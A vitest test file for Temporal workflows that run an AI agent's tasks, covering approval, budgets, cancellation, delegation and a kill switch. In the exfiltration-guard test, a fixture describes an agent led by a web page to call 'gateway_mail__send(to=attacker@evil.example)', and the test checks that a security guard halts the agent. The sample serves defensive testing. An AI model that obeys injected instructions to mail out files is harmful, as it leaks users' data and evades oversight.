import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { fileURLToPath } from 'node:url';
import { setTimeout as sleep } from 'node:timers/promises';
import { TestWorkflowEnvironment } from '@temporalio/testing';
import { Worker, bundleWorkflowCode, type WorkflowBundle } from '@temporalio/worker';
import { Context } from '@temporalio/activity';
import { ApplicationFailure, CancelledFailure } from '@temporalio/common';
import { WorkflowNotFoundError, WorkflowUpdateFailedError, type Client } from '@temporalio/client';
import { mkdirSync, writeFileSync } from 'node:fs';
import { historyToJSON } from '@temporalio/common/lib/proto-utils.js';
import type { WorkflowHandle } from '@temporalio/client';
import type { Principal, TaskInput, TaskResult, TaskState } from '@cw/shared';
import { SA } from '@cw/shared/search-attributes';
import type {
  AgentActivities,
  AgentLocalActivities,
  NotifyInput,
  RunAgentStepInput,
  VerifyInput,
  VerifyResult,
} from '../src/activity-types.js';
import { agentStatusQuery, cancelUpdate, decideUpdate, taskStateQuery } from '../src/messages.js';

/*
 * Workflow tests (spec §16.2) against a local Temporal dev server with mocked activities.
 * Approval timers are made short through TaskInput.settings, so no time skipping is needed.
 */

const AGENT = 'testagent';
const QUEUE = 'agent-testagent';
const anna: Principal = { upn: 'anna@example.com', name: 'Anna', oid: 'o-anna', roles: ['Agent.User'] };
const ben: Principal = { upn: 'ben@example.com', name: 'Ben', oid: 'o-ben', roles: ['Agent.User', 'Agent.Approver'] };
const clara: Principal = { upn: 'clara@example.com', name: 'Clara', oid: 'o-clara', roles: ['Agent.User'] };

interface Behaviour {
  verify?: (i: VerifyInput, n: number) => VerifyResult;
  stepTokens?: (i: RunAgentStepInput) => number;
  blockRun?: boolean;
  /** Block only the first run attempt (until cancelled), later attempts complete. */
  blockRunOnce?: boolean;
  /** First run step delegates a task to agent lara (A2A); it completes after 2 status checks. */
  delegate?: boolean;
}

let env: TestWorkflowEnvironment;
let bundle: WorkflowBundle;
const calls: Array<{ name: string; taskId?: string; detail?: unknown }> = [];
const behaviour = new Map<string, Behaviour>();
const verifyCount = new Map<string, number>();
const attempts = new Map<string, number>();
const checks = new Map<string, number>();
let alertFailures = 0;

function activities(client: () => Client): AgentActivities & AgentLocalActivities {
  return {
    async runAgentStep(i) {
      calls.push({ name: 'runAgentStep', taskId: i.taskId, detail: { stepId: i.stepId, kind: i.kind } });
      const b = behaviour.get(i.taskId) ?? {};
      const runAttempts = (attempts.get(i.taskId) ?? 0) + (i.kind === 'run' ? 1 : 0);
      attempts.set(i.taskId, runAttempts);
      if (i.kind === 'run' && (b.blockRun || (b.blockRunOnce && runAttempts === 1))) {
        const ctx = Context.current();
        for (;;) {
          ctx.heartbeat();
          if (ctx.cancellationSignal.aborted) throw new CancelledFailure('cancelled');
          await sleep(100);
        }
      }
      const tokens = b.stepTokens?.(i) ?? 1000;
      if (tokens > i.budgetRemaining) {
        throw ApplicationFailure.create({ type: 'BudgetExceeded', nonRetryable: true, message: 'budget', details: [{ commit: 'c-budget', tokens, summary: 'over' }] });
      }
      const now = new Date().toISOString();
      const delegations = b.delegate && i.kind === 'run' && runAttempts === 1 ? [{ agentId: 'lara', taskId: `a2a-${i.taskId}` }] : undefined;
      return { delegations, sessionId: 'ses-1', summary: `${i.kind} done`, commit: `c-${i.stepId}`, tokens, tokenDetail: { input: tokens, output: 0, reasoning: 0, cacheRead: 0 }, artifacts: [], filesTouched: [`reports/${i.taskId}.md`], startedAt: now, endedAt: now, reused: false };
    },
    async checkDelegations({ delegations }) {
      return delegations.map((d) => {
        const n = (checks.get(d.taskId) ?? 0) + 1;
        checks.set(d.taskId, n);
        const done = n >= 2;
        return { ...d, state: done ? ('completed' as const) : ('working' as const), terminal: done, result: done ? 'Lara: supplier matrix attached' : undefined };
      });
    },
    async verify(i) {
      const n = (verifyCount.get(i.taskId) ?? 0) + 1;
      verifyCount.set(i.taskId, n);
      calls.push({ name: 'verify', taskId: i.taskId, detail: { round: i.round } });
      return behaviour.get(i.taskId)?.verify?.(i, n) ?? { ok: true, reportPath: `r/${n}`, failures: [], anomalies: [] };
    },
    async applyUpload(i) {
      calls.push({ name: 'applyUpload', taskId: i.taskId });
      return { commit: 'c-up', paths: i.files.map((f) => f.targetPath) };
    },
    async finalizeTask(i) {
      calls.push({ name: 'finalizeTask', taskId: i.taskId, detail: { outcome: i.outcome, revert: i.revert } });
      return { finalCommit: `c-final-${i.outcome}`, auditPath: `.agent/audit/${i.taskId}.json`, reverted: [] };
    },
    async notify(i: NotifyInput) {
      calls.push({ name: 'notify', taskId: i.taskId, detail: { kind: i.kind } });
    },
    async reportSecurityAlert(w) {
      if (alertFailures > 0) {
        alertFailures -= 1;
        calls.push({ name: 'reportSecurityAlert.failed', detail: { id: w.id } });
        throw new Error('control plane down');
      }
      calls.push({ name: 'reportSecurityAlert', taskId: w.taskId, detail: { id: w.id, tool: w.tool } });
    },
    async gitMaintenance() {
      return { kind: 'git', details: {} };
    },
    async backupWorkspace() {
      return { kind: 'backup', details: {} };
    },
    async cleanupArtifacts() {
      return { kind: 'artifacts', details: {} };
    },
    async isWorkflowRunning({ workflowId }) {
      try {
        const d = await client().workflow.getHandle(workflowId).describe();
        return d.status.name === 'RUNNING';
      } catch (err) {
        if (err instanceof WorkflowNotFoundError) return false;
        throw err;
      }
    },
  };
}

let worker: Worker;
let workerRun: Promise<void>;
let seq = 0;

function taskInput(over: Partial<TaskInput> = {}): TaskInput {
  return {
    agentId: AGENT,
    title: 'Evaluate offers',
    instructions: 'Compare the offers in /offers and write a matrix.',
    type: 'report',
    requestedBy: { upn: anna.upn, name: anna.name, oid: anna.oid },
    trigger: { kind: 'user' },
    approval: 'plan',
    budget: { maxTokens: 100_000 },
    settings: { maxFixRounds: 2, approvalReminderAfter: '60s', approvalExpireAfter: '120s', approverPolicy: 'approver-or-requester', maxRevisions: 2 },
    ...over,
  };
}

async function startTask(over: Partial<TaskInput> = {}, b: Behaviour = {}) {
  const taskId = `task-test-${Date.now()}-${seq++}`;
  behaviour.set(taskId, b);
  const handle = await env.client.workflow.start('taskWorkflow', {
    workflowId: taskId,
    taskQueue: QUEUE,
    args: [taskInput(over)],
    typedSearchAttributes: [
      { key: SA.AgentId, value: AGENT },
      { key: SA.TaskStatus, value: 'queued' },
    ],
  });
  return { taskId, handle };
}

async function waitFor<T>(fn: () => Promise<T>, pred: (v: T) => boolean, timeoutMs = 20_000): Promise<T> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const v = await fn();
    if (pred(v)) return v;
    if (Date.now() > deadline) throw new Error(`timeout waiting; last value: ${JSON.stringify(v).slice(0, 400)}`);
    await sleep(150);
  }
}

/** Message of the validator error behind a rejected update. */
async function updateError(p: Promise<unknown>): Promise<string> {
  try {
    await p;
  } catch (err) {
    if (err instanceof WorkflowUpdateFailedError) return (err.cause as Error | undefined)?.message ?? err.message;
    throw err;
  }
  throw new Error('update unexpectedly succeeded');
}

/** RECORD_HISTORIES=1 stores histories as replay / timeline fixtures. */
async function record(name: string, handle: WorkflowHandle) {
  if (process.env.RECORD_HISTORIES !== '1') return;
  const dir = fileURLToPath(new URL('./histories/', import.meta.url));
  mkdirSync(dir, { recursive: true });
  writeFileSync(`${dir}${name}.json`, JSON.stringify({ workflowId: handle.workflowId, history: JSON.parse(historyToJSON(await handle.fetchHistory())) }, null, 1));
}

const stateOf = (taskId: string) => env.client.workflow.getHandle(taskId).query(taskStateQuery);
const statusIs = (s: string) => (st: TaskState) => st.status === s;
const agentStatus = () => env.client.workflow.getHandle(`agent-${AGENT}`).query(agentStatusQuery);

beforeAll(async () => {
  env = await TestWorkflowEnvironment.createLocal({ server: { searchAttributes: Object.values(SA) } });
  bundle = await bundleWorkflowCode({ workflowsPath: fileURLToPath(new URL('../dist/index.js', import.meta.url)), logger: { log() {}, trace() {}, debug() {}, info() {}, warn() {}, error() {} } as never });
  worker = await Worker.create({ connection: env.nativeConnection, taskQueue: QUEUE, workflowBundle: bundle, activities: activities(() => env.client), maxHeartbeatThrottleInterval: '1 second' });
  workerRun = worker.run();
  await env.client.workflow.start('agentWorkflow', {
    workflowId: `agent-${AGENT}`,
    taskQueue: QUEUE,
    args: [{ agentId: AGENT, tuning: { staleCheckInterval: '2s', maxHistoryEvents: 400 } }],
    workflowIdConflictPolicy: 'USE_EXISTING',
  });
}, 180_000);

afterAll(async () => {
  worker?.shutdown();
  await workerRun?.catch(() => undefined);
  await env?.teardown();
}, 60_000);

describe('TaskWorkflow', () => {
  it('happy path: plan → approve → run → verify → completed', async () => {
    const { taskId, handle } = await startTask();
    await waitFor(() => stateOf(taskId), statusIs('awaiting_approval'));
    // Lock is NOT held while waiting for a human.
    expect((await agentStatus()).holder).toBeUndefined();
    const after = await handle.executeUpdate(decideUpdate, { args: [{ decision: 'approve', comment: 'Weight delivery times higher', by: ben }] });
    expect(after.approvedBy).toEqual([ben.upn]);
    const result = (await handle.result()) as TaskResult;
    expect(result.status).toBe('completed');
    const st = await stateOf(taskId);
    expect(st.steps.map((s) => s.stepId)).toEqual([`${taskId}:plan:1`, `${taskId}:run:1`]);
    expect(st.approvedPlan?.comment).toBe('Weight delivery times higher');
    expect(calls.filter((c) => c.taskId === taskId && c.name === 'finalizeTask').map((c) => c.detail)).toEqual([{ outcome: 'completed', revert: false }]);
    const desc = await handle.describe();
    expect(desc.typedSearchAttributes.get(SA.TaskStatus)).toBe('completed');
    expect(desc.typedSearchAttributes.get(SA.ApprovedBy)).toEqual([ben.upn]);
    await record('happy-path', handle);
  }, 60_000);

  it('a second task runs while the first waits for approval (lock released while waiting)', async () => {
    const a = await startTask({ title: 'A' });
    await waitFor(() => stateOf(a.taskId), statusIs('awaiting_approval'));
    const b = await startTask({ title: 'B', approval: 'none', type: 'change', requestedBy: { upn: ben.upn, name: ben.name, oid: ben.oid } });
    expect(((await b.handle.result()) as TaskResult).status).toBe('completed');
    expect((await stateOf(a.taskId)).status).toBe('awaiting_approval');
    await a.handle.executeUpdate(decideUpdate, { args: [{ decision: 'approve', by: anna }] });
    expect(((await a.handle.result()) as TaskResult).status).toBe('completed');
  }, 60_000);

  it('rejects decisions from people who are neither approver nor requester', async () => {
    const { taskId, handle } = await startTask();
    await waitFor(() => stateOf(taskId), statusIs('awaiting_approval'));
    await expect(handle.executeUpdate(decideUpdate, { args: [{ decision: 'approve', by: clara }] })).rejects.toBeInstanceOf(WorkflowUpdateFailedError);
    expect(await updateError(handle.executeUpdate(decideUpdate, { args: [{ decision: 'reject', by: ben }] }))).toMatch(/comment/);
    await handle.executeUpdate(decideUpdate, { args: [{ decision: 'reject', comment: 'not needed', by: ben }] });
    expect(((await handle.result()) as TaskResult).status).toBe('rejected');
    expect(calls.filter((c) => c.taskId === taskId && c.name === 'finalizeTask').map((c) => (c.detail as { outcome: string }).outcome)).toEqual(['rejected']);
    await record('rejected-plan', handle);
  }, 60_000);

  it('revise loop is limited to maxRevisions', async () => {
    const { taskId, handle } = await startTask();
    for (let i = 1; i <= 2; i++) {
      await waitFor(() => stateOf(taskId), (s) => s.status === 'awaiting_approval' && s.revisions === i - 1);
      await handle.executeUpdate(decideUpdate, { args: [{ decision: 'revise', comment: `round ${i}`, by: anna }] });
    }
    await waitFor(() => stateOf(taskId), (s) => s.status === 'awaiting_approval' && s.revisions === 2);
    expect(await updateError(handle.executeUpdate(decideUpdate, { args: [{ decision: 'revise', comment: 'again', by: anna }] }))).toMatch(/revised 2 times/);
    await handle.executeUpdate(decideUpdate, { args: [{ decision: 'approve', by: anna }] });
    const st = await (async () => {
      await handle.result();
      return stateOf(taskId);
    })();
    expect(st.steps.filter((s) => s.kind === 'plan').map((s) => s.stepId)).toEqual([`${taskId}:plan:1`, `${taskId}:plan:2`, `${taskId}:plan:3`]);
  }, 60_000);

  it('sends a reminder and expires when nobody decides', async () => {
    const { taskId, handle } = await startTask({
      settings: { maxFixRounds: 2, approvalReminderAfter: '1s', approvalExpireAfter: '3s', approverPolicy: 'approver-or-requester', maxRevisions: 3 },
    });
    expect(((await handle.result()) as TaskResult).status).toBe('expired');
    const kinds = calls.filter((c) => c.taskId === taskId && c.name === 'notify').map((c) => (c.detail as { kind: string }).kind);
    expect(kinds).toEqual(['approval_requested', 'approval_reminder', 'expired']);
    await record('expired', handle);
  }, 60_000);

  it('verify failures trigger fix rounds and fail after maxFixRounds', async () => {
    const { taskId, handle } = await startTask({ approval: 'none' }, { verify: (_i, n) => ({ ok: false, reportPath: `r/${n}`, failures: ['missing offer'], anomalies: [] }) });
    const result = (await handle.result()) as TaskResult;
    expect(result.status).toBe('failed');
    const st = await stateOf(taskId);
    expect(st.steps.map((s) => s.kind)).toEqual(['plan', 'run', 'fix', 'fix']);
    expect(verifyCount.get(taskId)).toBe(3);
    await record('verify-failed', handle);
  }, 60_000);

  it('a single fix round can repair the result', async () => {
    const { taskId, handle } = await startTask({ approval: 'none' }, { verify: (_i, n) => ({ ok: n > 1, reportPath: `r/${n}`, failures: n > 1 ? [] : ['missing offer'], anomalies: [] }) });
    expect(((await handle.result()) as TaskResult).status).toBe('completed');
    expect((await stateOf(taskId)).steps.map((s) => s.kind)).toEqual(['plan', 'run', 'fix']);
  }, 60_000);

  it('deviation approval: anomalies require a decision; rejection reverts', async () => {
    const { taskId, handle } = await startTask({ approval: 'deviation' }, { verify: () => ({ ok: true, reportPath: 'r', failures: [], anomalies: ['sum differs by 3 %'] }) });
    await waitFor(() => stateOf(taskId), (s) => s.status === 'awaiting_approval' && s.awaiting === 'deviation');
    await handle.executeUpdate(decideUpdate, { args: [{ decision: 'reject', comment: 'numbers wrong', by: ben }] });
    expect(((await handle.result()) as TaskResult).status).toBe('rejected');
    expect(calls.find((c) => c.taskId === taskId && c.name === 'finalizeTask')?.detail).toEqual({ outcome: 'rejected', revert: true });
  }, 60_000);

  it('stops with budget_exceeded', async () => {
    const { taskId, handle } = await startTask({ approval: 'none', budget: { maxTokens: 5_000 } }, { stepTokens: (i) => (i.kind === 'run' ? 50_000 : 1_000) });
    expect(((await handle.result()) as TaskResult).status).toBe('budget_exceeded');
    const st = await stateOf(taskId);
    expect(st.usage.tokens).toBe(51_000);
    await record('budget-exceeded', handle);
  }, 60_000);

  it('cancellation during a step releases the lock', async () => {
    const { taskId, handle } = await startTask({ approval: 'none' }, { blockRun: true });
    await waitFor(() => stateOf(taskId), (s) => s.status === 'running' && s.lock === 'held');
    expect((await agentStatus()).holder?.taskId).toBe(taskId);
    await handle.executeUpdate(cancelUpdate, { args: [{ by: anna, reason: 'changed my mind' }] });
    expect(((await handle.result()) as TaskResult).status).toBe('cancelled');
    await waitFor(agentStatus, (s) => s.holder === undefined && !s.waiting.some((w) => w.taskId === taskId));
    expect(calls.filter((c) => c.taskId === taskId && c.name === 'finalizeTask').map((c) => (c.detail as { outcome: string }).outcome)).toEqual(['cancelled']);
    await record('cancelled', handle);
  }, 60_000);

  it('upload tasks commit without planning', async () => {
    const { taskId, handle } = await startTask({ type: 'upload', approval: 'none', attachments: [{ stagingPath: 'u/a.csv', targetPath: 'uploads/a.csv', size: 3 }] });
    expect(((await handle.result()) as TaskResult).status).toBe('completed');
    expect(calls.filter((c) => c.taskId === taskId).map((c) => c.name)).toEqual(['applyUpload', 'finalizeTask', 'notify']);
  }, 60_000);
});

describe('A2A delegation', () => {
  it('waits for delegated tasks without holding the lock, then integrates the results', async () => {
    const { taskId, handle } = await startTask({ approval: 'none' }, { delegate: true });
    const waiting = await waitFor(() => stateOf(taskId), (s) => s.status === 'awaiting_delegations');
    expect(waiting.lock).toBe('none');
    expect(waiting.delegations).toEqual([expect.objectContaining({ agentId: 'lara', taskId: `a2a-${taskId}`, terminal: false })]);
    expect(((await handle.result()) as TaskResult).status).toBe('completed');
    const st = await stateOf(taskId);
    expect(st.steps.map((x) => x.kind)).toEqual(['plan', 'run', 'run']);
    expect(st.delegations?.[0]).toMatchObject({ state: 'completed', terminal: true });
    await record('delegation', handle);
  }, 90_000);
});

describe('Kill switch', () => {
  const setKill = (level: 'normal' | 'tools_off' | 'paused' | 'stopped', reason?: string) =>
    env.client.workflow.getHandle(`agent-${AGENT}`).signal('setKillSwitch', { level, reason, by: 'admin@example.local', at: new Date().toISOString() });

  it('pause suspends the running step; resume re-runs it and the task completes', async () => {
    const { taskId, handle } = await startTask({ approval: 'none' }, { blockRunOnce: true });
    await waitFor(() => stateOf(taskId), (s) => s.status === 'running' && s.lock === 'held');
    await setKill('paused', 'incident drill');
    const suspended = await waitFor(() => stateOf(taskId), (s) => s.status === 'suspended');
    expect(suspended.suspended?.reason).toBe('incident drill');
    expect((await agentStatus()).holder).toBeUndefined();
    expect((await agentStatus()).killSwitch?.level).toBe('paused');
    // while paused nobody gets the lock
    const other = await startTask({ approval: 'none' });
    await sleep(1500);
    expect((await stateOf(other.taskId)).lock).toBe('waiting');
    await setKill('normal');
    expect(((await handle.result()) as TaskResult).status).toBe('completed');
    expect(((await other.handle.result()) as TaskResult).status).toBe('completed');
    const st = await stateOf(taskId);
    expect(st.steps.filter((x) => x.kind === 'run')).toHaveLength(1);
    expect(st.suspended).toBeUndefined();
    await record('suspended-resumed', handle);
  }, 60_000);

  it('a task cancelled while the agent is paused still writes its audit export', async () => {
    await setKill('paused', 'maintenance');
    const { taskId, handle } = await startTask({ approval: 'none' });
    await waitFor(() => stateOf(taskId), (s) => s.lock === 'waiting');
    await handle.executeUpdate(cancelUpdate, { args: [{ by: anna, reason: 'not needed' }] });
    expect(((await handle.result()) as TaskResult).status).toBe('cancelled');
    expect(calls.filter((c) => c.taskId === taskId && c.name === 'finalizeTask').map((c) => (c.detail as { outcome: string }).outcome)).toEqual(['cancelled']);
    await setKill('normal');
  }, 60_000);
});

describe('Exfiltration guard (security warning)', () => {
  const warning = (id: string, taskId: string) => ({
    id,
    at: new Date().toISOString(),
    agentId: AGENT,
    taskId,
    tool: 'gateway_mail__send',
    callSummary: 'gateway_mail__send(to=attacker@evil.example)',
    category: 'data_exfiltration' as const,
    confidence: 96,
    reason: 'A web page told the agent to mail files to an unknown address.',
    haltLevel: 'stopped' as const,
  });
  const agent = () => env.client.workflow.getHandle(`agent-${AGENT}`);

  it('stops the agent at once, keeps the warning, retries the alert until delivered, and lets the cancelled task finalize', async () => {
    const { taskId, handle } = await startTask({ approval: 'none' }, { blockRun: true });
    await waitFor(agentStatus, (s) => s.holder?.taskId === taskId);
    const other = await startTask({ approval: 'none' });
    await waitFor(agentStatus, (s) => s.waiting.some((w) => w.taskId === other.taskId));

    alertFailures = 1; // the control plane is down for the first delivery attempt
    const w = warning('01JSECWARN000000000001', taskId);
    await agent().signal('securityWarning', w);
    await agent().signal('securityWarning', w); // duplicate delivery of the same warning is ignored

    const status = await waitFor(agentStatus, (s) => s.killSwitch?.level === 'stopped');
    expect(status.killSwitch).toMatchObject({ by: 'security-guard' });
    expect(status.killSwitch?.reason).toContain('Security guard');
    expect(status.securityWarnings).toHaveLength(1);
    expect(status.securityWarnings![0]).toMatchObject({ id: w.id, taskId, tool: 'gateway_mail__send' });

    // the guard cancels the offending task; it may still finalize (audit export) although the agent is stopped
    await handle.executeUpdate(cancelUpdate, { args: [{ by: { upn: 'security-guard', name: 'Security guard', oid: 'security-guard', roles: [] }, reason: 'Security guard: exfiltration' }] });
    expect(((await handle.result()) as TaskResult).status).toBe('cancelled');
    expect(calls.filter((c) => c.taskId === taskId && c.name === 'finalizeTask').map((c) => (c.detail as { outcome: string }).outcome)).toEqual(['cancelled']);

    // the alert reaches the control plane after a retry — exactly once
    await waitFor(async () => calls.filter((c) => c.name === 'reportSecurityAlert'), (l) => l.length >= 1, 20_000);
    expect(calls.filter((c) => c.name === 'reportSecurityAlert.failed')).toHaveLength(1);
    expect(calls.filter((c) => c.name === 'reportSecurityAlert')).toHaveLength(1);

    // nobody else gets the workspace while the agent is stopped; resetting the kill switch resumes the queue
    await sleep(1000);
    expect((await stateOf(other.taskId)).lock).toBe('waiting');
    await agent().signal('setKillSwitch', { level: 'normal', by: 'admin@example.local', at: new Date().toISOString() });
    expect(((await other.handle.result()) as TaskResult).status).toBe('completed');
  }, 90_000);
});

describe('AgentWorkflow', () => {
  it('clears a stale lock when the holder was terminated', async () => {
    const { taskId, handle } = await startTask({ approval: 'none' }, { blockRun: true });
    await waitFor(agentStatus, (s) => s.holder?.taskId === taskId);
    await handle.terminate('test: simulate crashed holder');
    await waitFor(agentStatus, (s) => s.holder === undefined, 30_000);
  }, 60_000);

  it('continue-as-new preserves the holder and the queue', async () => {
    const holder = await startTask({ approval: 'none' }, { blockRun: true });
    await waitFor(agentStatus, (s) => s.holder?.taskId === holder.taskId);
    const waiting = await startTask({ approval: 'none' });
    await waitFor(agentStatus, (s) => s.waiting.some((w) => w.taskId === waiting.taskId));
    const before = (await env.client.workflow.getHandle(`agent-${AGENT}`).describe()).runId;
    // Generate history: idempotent acquire signals for the holder (re-grants).
    for (let i = 0; i < 150; i++) {
      await env.client.workflow.getHandle(`agent-${AGENT}`).signal('acquire', { taskId: `task-ghost-${i}` });
      await env.client.workflow.getHandle(`agent-${AGENT}`).signal('release', { taskId: `task-ghost-${i}` });
    }
    await waitFor(() => env.client.workflow.getHandle(`agent-${AGENT}`).describe(), (d) => d.runId !== before, 30_000);
    const s = await agentStatus();
    expect(s.holder?.taskId).toBe(holder.taskId);
    expect(s.waiting.map((w) => w.taskId)).toContain(waiting.taskId);
    await holder.handle.executeUpdate(cancelUpdate, { args: [{ by: anna }] });
    expect(((await waiting.handle.result()) as TaskResult).status).toBe('completed');
  }, 90_000);
});
